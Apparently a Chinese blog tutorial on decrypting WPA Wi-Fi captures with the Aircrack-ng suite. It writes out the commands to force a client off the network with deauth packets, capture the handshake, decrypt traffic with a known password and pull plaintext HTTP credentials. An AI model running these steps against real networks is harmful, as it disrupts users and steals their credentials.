---
title: WPA解密
date: 2020-04-25 19:06:01
categories: 无线渗透
tags: Aircrack-ng套件
---

### 前言

> 此方法用于解密wifi下的802.11*数据包，可截获HTTP下的明文密码等其他信息，但HTTPS下的数据包仍无法解密，此方法成功必须满足以下两个条件。
> 1. 先破解目标wifi密码或已经知道目标密码
> 2. 抓取到握手包

<!--more-->

开启网卡监听模式

`airmon-ng start wlan0`

扫描附近热点

`airodump-ng wlan0mon`

![](http://cdn.laohuan.art/Snipaste_2019-09-26_19-38-20.png)

只抓取ESSID为test的数据包

`airodump-ng -c 12 --bssid B4:C4:FC:65:77:50 wlan0mon -w file.cap`

* -c 指定信道
* --w 指定保存的文件名（可不加后缀.cap，会自动生成）

使用 <kbd> Ctrl</kbd>+<kbd> c</kbd>  停止抓取,用wireshark打开数据包

![](http://cdn.laohuan.art/Snipaste_2019-09-26_19-51-53-1024x342.png)

发现都是802.11加密得数据包

### 解密数据包

1. 对test继续进行抓包

`airodump-ng -c 3 --bssid B4:C4:FC:65:77:50 wlan0mon -w test`

由于需要抓取握手包，我们发送deauth包让对方热点下的设备断开重连

`aireplay-ng  -0 15 -a B4:C4:FC:65:77:50 -c FC:64:BA:EB:78:B5 wlan0mon`

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-25-48.png)

*  -0 指定deauth包的数量
* -a 指定bssid
* -c 指定客户端的mac地址（抓包时的STATION）

2. 当出现红框内的 WPA handshake 表明抓取到握手包

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-27-21.png)

数分钟后，<Kbd>ctrl</kbd>+<kbd>c</kbd>停止抓包

在当前目录下生成一个test-01.cap的文件

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-33-31.png)

3. 解密这个数据包文件

`airdecap-ng -e test -b B4:C4:FC:65:77:50 -p 88888888 test-01.cap`

* 参数 -e 指定essid(wifi名字)
* -b 指定bssid
* -p 指定wifi密码

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-36-47.png)

红框内即为解密WPA包的数量

接下来会在当前目录生成一个已解密的dec.cap文件

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-37-59.png)

4. 用wireshark打开此数据包，已经可以看到具体协议的数据包，起初这些数据包是被802.11协议加密的

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-41-24-1024x297.png)

如果有明文传送的账号密码，在TCP流里很容易找到

![](http://cdn.laohuan.art/Snipaste_2019-09-27_20-44-41.png)

### 后话

当知道或已经破解了对方的wifi密码，可连接此wifi热点后再进行抓包，这时抓到的数据包就已经是解密的了（802.11协议的解密），不必再向本文如此大动干戈。当对方热点主人设置了指点mac地址的设备才可以连接wifi时，你知道对方密码也连接不上wifi时，便可参考此方法。